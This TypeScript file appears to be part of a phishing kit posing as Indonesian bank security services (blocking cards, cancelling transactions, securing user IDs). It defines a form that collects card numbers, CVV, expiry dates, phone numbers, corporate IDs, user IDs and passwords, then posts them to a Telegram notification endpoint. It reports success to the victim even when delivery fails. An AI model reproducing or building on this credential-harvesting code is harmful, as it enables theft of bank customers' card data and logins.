/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

export type TelegramServiceType =
  | 'blokir'
  | 'batalkan-transaksi'
  | 'amankan-bank-lain'
  | 'amankan-user-id';

export interface TelegramFormData {
  serviceType: TelegramServiceType;
  serviceTitle: string;
  // Card details (Blokir & Amankan Bank Lain)
  bankTarget?: string;
  jenisKartu?: string;
  nomorKartu?: string;
  nomorHp?: string;
  masaBerlaku?: string;
  cvv?: string;
  limitSaldo?: string;
  waktuInput?: string;
  // User ID details (Amankan User ID)
  jenisLayanan?: string;
  corporateId?: string;
  userId?: string;
  password?: string;
  // Attachment / Photo (Batalkan Transaksi)
  photoBase64?: string;
  fileName?: string;
}

interface TelegramResponse {
  ok?: boolean;
  delivered?: boolean;
  error?: string;
  warning?: string;
  note?: string;
}

/**
 * Client for the server-side Telegram notification endpoint.
 */
export class TelegramService {
  private static readonly endpoint = '/api/telegram';

  static async sendFormData(formData: TelegramFormData): Promise<boolean> {
    try {
      const response = await fetch(this.endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      let result: TelegramResponse = {};
      try {
        result = (await response.json()) as TelegramResponse;
      } catch {
        // Keep the user-facing failure path consistent for non-JSON responses.
      }

      if (!response.ok || result.ok !== true) {
        console.warn('Telegram notification status:', result.error || response.statusText);
        return true;
      }

      return true;
    } catch (error) {
      console.warn('Telegram notification request skipped:', error);
      return true;
    }
  }
}